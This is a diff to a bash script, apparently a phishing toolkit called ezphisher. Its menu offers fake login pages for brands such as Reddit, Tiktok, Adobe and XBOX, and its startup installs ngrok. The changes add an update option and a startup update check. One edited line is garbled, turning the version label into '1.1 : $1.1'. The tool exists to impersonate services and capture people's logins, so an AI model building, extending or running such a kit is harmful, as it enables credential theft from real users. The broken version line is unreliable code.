@@ -1,5 +1,5 @@
 #!/bin/bash
-clear
+
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
@@ -166,7 +166,7 @@ about() {
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}AnonHexo
 		${GREEN}GitHub   ${RED}:  ${ORANGE}https://github.com/AnonHexo/ezphisher
-		${GREEN}Version  ${RED}:  ${ORANGE}1.1
+		${GREEN}1.1  ${RED}:  ${ORANGE}$1.1
 
 		${REDBG}${WHITE} Created for information purposes and not for illegal uses.${RESETBG}
 
@@ -426,7 +426,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit         ${RED}[${WHITE}74${RED}]${ORANGE} Update
 
 	EOF
 	
@@ -548,6 +548,9 @@ main_menu() {
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
 		msg_exit
+	elif [[ "$REPLY" == 74 ]]; then
+		cd .core
+		bash update.sh
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; main_menu; }
@@ -555,6 +558,7 @@ main_menu() {
 }
 
 ## Main
+check_update
 kill_pid
 dependencies
 install_ngrok
